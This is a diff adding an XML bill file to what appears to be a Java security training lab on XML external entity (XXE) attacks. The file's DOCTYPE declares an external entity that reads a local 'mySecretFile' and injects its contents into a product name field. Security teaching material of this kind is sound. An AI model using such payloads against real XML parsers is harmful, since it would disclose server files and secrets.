@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE boo [
+        <!ENTITY xxe SYSTEM "file:////C:\\Git\\java\\java-security-labs\\labs\\lab-xxe\\xmls\\mySecretFile">
+        ]>
+<bill>
+    <product id="26">
+        <name>&xxe;</name>
+        <quantity>0</quantity>
+        <price>0</price>
+    </product>
+    <product id="28">
+        <name>Coolhacker</name>
+        <quantity>1</quantity>
+        <price>1337</price>
+    </product>
+    <product id="30">
+        <name>Dev stuff</name>
+        <quantity>30</quantity>
+        <price>1000</price>
+    </product>
+</bill>
